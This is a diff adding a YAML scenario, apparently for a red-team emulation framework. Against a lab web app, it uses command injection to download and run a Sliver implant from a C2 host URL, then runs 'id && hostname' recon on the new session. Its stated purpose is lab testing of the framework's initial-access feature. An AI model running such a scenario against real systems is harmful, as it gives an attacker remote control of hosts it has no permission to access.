@@ -1,0 +1,52 @@
+id: e2e-initial-access-web
+name: "Initial Access — vulnerable web app (command injection) → Sliver session"
+description: >
+  End-to-end scenario that does NOT require a pre-existing session_id. It exploits
+  the lab vulnweb target's command-injection endpoint to stage a Sliver beacon
+  (initial access), captures the resulting session, and runs post-exploitation
+  recon against it. Demonstrates the targets: block + the initial_access action.
+mitre_tactics: [initial-access, execution, discovery]
+tags: [example, initial-access, linux, e2e]
+
+# Named hosts an initial_access step can breach. attrs is arbitrary and forwarded
+# to the module (here: the vulnerable endpoint path).
+targets:
+  - name: web1
+    host: 172.20.0.30
+    port: 8080
+    attrs:
+      path: /ping
+
+steps:
+  # ── Initial access: exploit → beacon → session ────────────────────────────────
+  - id: breach
+    name: "Exploit vulnweb and stage Sliver beacon"
+    action:
+      type: initial_access
+      initial_access:
+        target: web1
+        module: external
+        config:
+          # argv for the built-in "external" module (JSON array as a string).
+          run: '["python3", "/opt/exploits/web_rce.py"]'
+          # The implant the injected command downloads and runs on the target.
+          implant_url: "http://172.20.0.10:8080/api/v1/implant/linux?c2=172.20.0.10"
+        wait:
+          timeout: "240s"
+          match_hostname: "victim-web"
+    output_var: web1_session   # <- new Sliver session UUID captured here
+    timeout: "300s"
+    on_fail: abort
+
+  # ── Post-exploitation against the freshly obtained session ────────────────────
+  - id: recon
+    name: "whoami / hostname on the new session"
+    depends_on: [breach]
+    session_id: "{{web1_session}}"   # existing per-step session mechanism
+    action:
+      type: command
+      command:
+        interpreter: sh
+        cmd: "id && hostname"
+    output_var: web1_whoami
+    timeout: "30s"
